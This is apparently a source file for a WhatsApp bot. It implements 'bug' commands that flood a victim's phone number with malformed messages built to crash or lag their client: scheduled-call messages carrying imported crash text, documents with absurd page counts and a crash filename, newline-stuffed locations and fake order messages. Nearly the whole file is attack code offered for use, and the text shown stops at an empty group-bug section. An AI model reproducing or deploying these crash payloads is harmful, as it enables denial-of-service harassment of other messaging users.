const { zokou } = require('../framework/zokou');
const { delay, loading, react } = require("../bdd/utils");
const moment = require('moment-timezone');
const conf = require('../set.js');
const fs = require('fs');
const path = require('path');
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

// bug database
const { bugtext1 } = require('../framework/bugs/bugtext1');
const { bugtext2 } = require('../framework/bugs/bugtext2');
const { bugtext3 } = require('../framework/bugs/bugtext3');
const { bugtext4 } = require('../framework/bugs/bugtext4');
const { bugtext5 } = require('../framework/bugs/bugtext5');
const { bugpdf } = require('../framework/bugs/bugpdf.js');


const category = 'dev';
const reaction = '😈';

const mess = {};
mess.prem = "You are not authorised to use this  command !!!";

const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/;

const timewisher = (time) => {
  if(time < "23:59:00"){
    return `Good Night 🌆`;
  }
  else if(time < "19:00:00"){
    return `Good Evening 🌆`;
  }
  else if(time < "18:00:00"){
    return `Good Evening 🌆`;
  }
  else if(time < "15:00:00"){
    return `Good Afternoon 🌅`;
  }
  else if(time < "11:00:00"){
    return `Good Morning 🌄`;
  }
  else if(time < "05:00:00"){
    return `Good Morning 🌄`;
  } 
};

async function sendbug(dest, zk, ms, repondre, amount, victims){
    const bug = `${bugtext1}`;
    for (let i = 0; i < victims.length; i++){
      if (!phoneRegex.test(victims[i])){
        repondre(`${victims[i]} not a valid phone number`);
        continue;
      } else {
        const victim = victims[i] + '@s.whatsapp.net';
        for (let j = 0; j < amount; j++){
          var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
            "scheduledCallCreationMessage": {
              "callType": "2",
              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
              "title": bug,
            }
        }), { userJid: dest, quoted : ms});
          try {
            zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
          } catch (e) {
            repondre(`An error occured while sending bugs to ${victims[i]}`);
            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
            break;
          }
          await delay(3000);
        }
        if (victims.length > 1)
          repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
        await delay(5000);
      }
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(', ')}.`);
  }

// --cmds--

// bug menu
zokou(
  {
    nomCom: 'bugmenu',
    categorie: category,
    reaction: reaction
  },
  
  async (dest, zk, commandOptions) => {
    const {ms,arg,repondre} = commandOptions;
    const mono = '```';
    const time = moment().tz(conf.TZ).format('HH:mm:ss');
    const versions = ['v1','v2'];
    const version = versions[Math.floor(Math.random() * versions.length)];
    const menuImage = fs.readFileSync(path.resolve(path.join(__dirname,'..','media','deleted-message.jpg')));
    const tumbUrl = 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg';
    let menu = `${mono}Hello ${ms.pushName}
${timewisher(time)}

≡𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
docbug
loccrash
amountbug <amount>
pmbug <number>
delaybug <number>
trollybug <number>
docubug <number>
unlimitedbug <number>
bombug <number>
lagbug <number>
gcbug <grouplink>
delaygcbug <grouplink>
trollygcbug <grouplink>
laggcbug <grouplink>
bomgcbug <grouplink>
unlimitedgcbug <grouplink>
docugcbug <grouplink>${mono}`;
  switch (version) {
    case 'v1': {
      zk.sendMessage(dest, {
      image: menuImage,
      caption: menu
      }, { quoted: ms });
    }
    break;
    case 'v2': {
      zk.sendMessage(dest, {
      image: menuImage,
      caption: menu,
      contextInfo: {
        mentionedJid:[ms.key.remoteJid],
        forwardingScore: 9999999,
        isForwarded: true, 
        externalAdReply:
          {
            showAdAttribution: true,
            title: `${conf.BOT}`,
            body: `Bot Created By ${conf.OWNER_NAME}`,
            thumbnail: {url: tumbUrl},
            thumbnailUrl: tumbUrl,
            previewType: 'PHOTO',
            sourceUrl: 'https://whatsapp.com/channel/0029VaKjSra9WtC0kuJqvl0g',
            mediaType: 1,
            renderLargerAbhinail: true
          }
        }
      }, { quoted: ms });
    }
    break;
  }
  }
);


//docbug 
zokou(
    {
      nomCom: 'docbug',
      categorie: category,
      reaction: reaction
    },
    
    async (dest, zk, commandOptions) => {
      const { ms, arg, repondre, superUser} = commandOptions;
      if (!superUser)
        return await repondre(mess.prem);
        
      // send loading message
      await loading(dest, zk);
      
      for (let i = 0; i < 25; i++) {
        const doc = {url: './set.js'};
        await zk.sendMessage(dest, {
          document: doc,
          mimetype: '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9',
          title: 'bx.pdf',
          pageCount: 9999999999,
          thumbnail: { url: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' },
          jpegThumbnail: { url: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' },
          mediaKey: 'ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=',
          fileName:
            '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n' +
            bugpdf,
         });
      }
      await zk.sendMessage(dest, {react: {text :'✅', key: ms.key}});
    }
);

//loccrash
zokou(
    {
      nomCom: 'loccrash',
      reaction: '\uD83D\uDD16',
      categorie: category
    },
    
    async (dest, zk, commandOptions) => {
      const { ms, arg, repondre, superUser} = commandOptions;
      if (!superUser)
        return await repondre(mess.prem);
      await loading(dest, zk);
      
      for (let i = 0; i < 20; i++){
        for(let j = 0;j < '3';j++) {
          zk.sendMessage(dest, {
            location: {
            degreesLatitude: -6.28282828,
            degreesLongitude: -1.2828,
            name: 'BRUX0N3RD\n\n\n\n\n\n\n\n',
          }
          }, { quoted: ms});
        }
      }
      await zk.sendMessage(dest, {react: {text :'✅', key: ms.key}});
    }
);
  
// amountbug
zokou(
  {
    nomCom: 'amountbug',
    categorie: category,
    reaction: reaction
  },
  
  async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
    
    if (!superUser) 
      return await repondre(mess.prem);
    if (!arg[0])
      return await repondre(`Use ${prefixe}amountbug amount\n> Example ${prefixe}amountbug 5`);
      
    const amount = parseInt(arg[0]);
    if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
      return await repondre(`use a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
    for (let i=0; i < amount; i++) {
      const bug = `${bugtext1}`;
      var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
      "scheduledCallCreationMessage": {
      "callType": "2",
      "scheduledTimestampMs": `${moment(1000).tz('Asia/Kolkata').format("DD/MM/YYYY HH:mm:ss")}`,
      "title": bug,}}), { userJid: dest, quoted : ms});
        try {
            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
        } catch (e) {
            await repondre(`An error occured while sending bugs`);
            console.log(`An error occured while sending bugs: ${e}`);
            return;
        }
    await delay(3000);
    }
    await repondre(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`);
    await react(dest, zk, ms, '✅');
  }
);

//pmbug
zokou(
  {
    nomCom: 'pmbug',
    categorie: category,
    reaction: reaction
  },
  
  async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser, prefixe} = commandOptions;
    if (!superUser)
      return await repondre(mess.prem);
    if (!arg[0])
      return await repondre(`Use ${prefixe}pmbug amount | numbers\n> Example ${prefixe}pmbug 30 |${conf.NUMERO_OWNER} or ${prefixe}pmbug ${conf.NUMERO_OWNER.split(',')[0]}`);
    await loading(dest, zk);
    const text = arg.join('');
    let amount = 30;
    let victims = [];
    if (arg.length === 1){
      victims.push(arg[0]);
      await repondre(`sending ${amount} bugs to ${victims[0]}`);
      try {
        await sendbug(dest, zk, ms, repondre, amount, victims);
        } catch (e){
          await repondre('An error occured');
          console.log(`An error occured: ${e}`);
          await react(dest, zk, ms, '⚠️');
      }
    } else {
      amount = parseInt(text.split('|')[0].trim());
      if (isNaN(amount)){
        return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
      } else {
        victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
        if (victims.length > 0){
          await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
          try {
            await sendbug(dest, zk, ms, repondre, amount, victims);
          } catch (e){
            await repondre('An error occured');
            console.log(`An error occured: ${e}`);
            await react(dest, zk, ms, '⚠️');
          }
        } else {
          return await repondre('No victims specfied');
        }
      }
    }
    await react(dest, zk, ms, '✅');
  }
  );
  
//delaybug
zokou(
  {
    nomCom: 'delaybug',
    categorie: category,
    reaction: reaction
  },
  
  async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser,prefixe } = commandOptions;
    if (!superUser)
      return await repondre(mess.prem);
    if (!arg[0])
      return await repondre(`Use ${prefixe}delaybug number\n> Example ${prefixe}delaybug ${conf.NUMERO_OWNER.split(',')[0]}`);
    await loading(dest, zk);
    const victim = arg[0].trim() + '@s.whatsapp.net';
    const amount = 30;
    const bug = bugtext2;
    if (!phoneRegex.test(arg[0].trim())){
        return await repondre(`${arg[0]} not a valid phone number`);
    } else {
      for (let i = 0; i < amount; i++){
        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
            "scheduledCallCreationMessage": {
              "callType": "2",
              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
              "title": bug,
            }
        }), { userJid: dest, quoted : ms});
        try {
            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
        } catch (e) {
            await repondre(`An error occured while sending bugs to ${arg[0]}`);
            await react(dest, zk, ms, '⚠️');
            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
            return;
        }
        await delay(3000);
      }
      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
      await react(dest, zk, ms, '✅');
    }
  }
);

//docubug
zokou(
  {
    nomCom: 'docubug',
    categorie: category,
    reaction: reaction
  },
  
  async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
    
    if (!superUser)
      return await repondre(mess.prem);
    if (!arg[0])
      return await repondre(`Use ${prefixe}docubug amount\n> Example ${prefixe}docubug ${conf.NUMERO_OWNER.split(',')[0]}`);
    await loading(dest, zk);
    const victim = arg[0].trim() + '@s.whatsapp.net';
    const amount = 15;
    const bug = `${bugtext1}`;
    if (!phoneRegex.test(arg[0].trim())){
      return await repondre(`${arg[0]} not a valid phone number`);
    } else {
      for (let i = 0; i < amount; i++){
        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
            "scheduledCallCreationMessage": {
              "callType": "2",
              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
              "title": bug,
            }
        }), { userJid: dest, quoted : ms});
        try {
            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
        } catch (e) {
            await repondre(`An error occured while sending bugs to ${arg[0]}`);
            await react(dest, zk, ms, '⚠️');
            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
            return;
        }
        await delay(3000);
      }
      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
      await react(dest, zk, ms, '✅');
    }
  }
);

//unlimitedbug
zokou(
  {
    nomCom: 'unlimitedbug',
    categorie: category,
    reaction: reaction
  },
  
  async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
    if (!superUser)
      return await repondre(mess.prem);
    if (!arg[0])
      return await repondre(`Use ${prefixe}unlimitedbug amount\n> Example ${prefixe}unlimitedbug ${conf.NUMERO_OWNER.split(',')[0]}`);
    await loading(dest, zk);
    const victim = arg[0].trim() + '@s.whatsapp.net';
    const amount = 30;
    const bug = bugtext3;
    if (!phoneRegex.test(arg[0].trim())){
      return await repondre(`${arg[0]} not a valid phone number`);
    } else {
      for (let i = 0; i < amount; i++){
        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
            "scheduledCallCreationMessage": {
              "callType": "2",
              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
              "title": bug,
            }
        }), { userJid: dest, quoted : ms});
        try {
            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
        } catch (e) {
            await repondre(`An error occured while sending bugs to ${arg[0]}`);
            await react(dest, zk, ms, '⚠️');
            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
            return;
        }
        await delay(3000);
      }
      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
      await react(dest, zk, ms, '✅');
    }
  }
);

//bombug
zokou(
  {
    nomCom: 'bombug',
    categorie: category,
    reaction: reaction
  },
  async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
    if (!superUser)
      return await repondre(mess.prem);
    if (!arg[0])
      return await repondre(`Use ${prefixe}bombug amount\n> Example ${prefixe}bombug ${conf.NUMERO_OWNER.split(',')[0]}`);
    await loading(dest, zk);
    const victim = arg[0].trim() + '@s.whatsapp.net';
    const amount = 30;
    const bug = bugtext4;
    if (!phoneRegex.test(arg[0].trim())){
      return await repondre(`${arg[0]} not a valid phone number`);
    } else {
      for (let i = 0; i < amount; i++){
        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
            "scheduledCallCreationMessage": {
              "callType": "2",
              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
              "title": bug,
            }
        }), { userJid: dest, quoted : ms});
        try {
            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
        } catch (e) {
            await repondre(`An error occured while sending bugs to ${arg[0]}`);
            await react(dest, zk, ms, '⚠️');
            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
            return;
        }
        await delay(3000);
      }
      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
      await react(dest, zk, ms, '✅');
    }
  }
);

//lagbug
zokou(
  {
    nomCom: 'lagbug',
    categorie: category,
    reaction: reaction
  },
  
  async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
    if (!superUser)
      return await repondre(mess.prem);
    if (!arg[0])
      return await repondre(`Use ${prefixe}lagbug amount\n> Example ${prefixe}lagbug ${conf.NUMERO_OWNER.split(',')[0]}`);
    await loading(dest, zk);
    const victim = arg[0].trim() + '@s.whatsapp.net';
    const amount = 30;
    const bug = bugtext2;
    if (!phoneRegex.test(arg[0].trim())){
      return await repondre(`${arg[0]} not a valid phone number`);
    } else {
      for (let i = 0; i < amount; i++){
        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
            "scheduledCallCreationMessage": {
              "callType": "2",
              "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
              "title": bug,
            }
        }), { userJid: dest, quoted : ms});
        try {
            await zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
        } catch (e) {
            await repondre(`An error occured while sending bugs to ${arg[0]}`);
            await react(dest, zk, ms, '⚠️');
            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
            return;
        }
        await delay(3000);
      }
      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
      await react(dest, zk, ms, '✅');
    }
  }
);

//trollybug
zokou(
  {
    nomCom: 'trollybug',
    categorie: category,
    reaction: reaction
  },
  
  async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
    if (!superUser)
      return await repondre(mess.prem);
    if (!arg[0])
      return await repondre(`Use ${prefixe}trollybug amount\n> Example ${prefixe}trollybug ${conf.NUMERO_OWNER.split(',')[0]}`);
    await loading(dest, zk);
    const victim = arg[0].trim() + '@s.whatsapp.net';
    const amount = 15;
    if (!phoneRegex.test(arg[0].trim())){
      return await repondre(`${arg[0]} not a valid phone number`);
    } else {
      for (let i = 0; i < amount; i++){
        var order = generateWAMessageFromContent(dest, proto.Message.fromObject({
            "orderMessage": {
              "orderId": "599519108102353",
              "thumbnail": { url: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' },
              "itemCount": 1999,
              "status": "INQUIRY",
              "surface": "CATALOG",
              "message": `${conf.BOT}`,
              "orderTitle": " TROLLY BUG ", 
              "sellerJid": "263785028126@s.whatsapp.net",
              "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
            }
        }), { userJid: dest, quoted : ms});
        try {
            await zk.relayMessage(victim, order.message, { messageId: order.key.id });
        } catch (e) {
            await repondre(`An error occured while sending bugs to ${arg[0]}`);
            await react(dest, zk, ms, '⚠️');
            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
            return;
        }
        await delay(3000);
      }
      await repondre(`*Successfully sent bugs to ${arg[0]} Please pause for 3 minutes*`);
      await react(dest, zk, ms, '✅');
    }
  }
);

//gcbug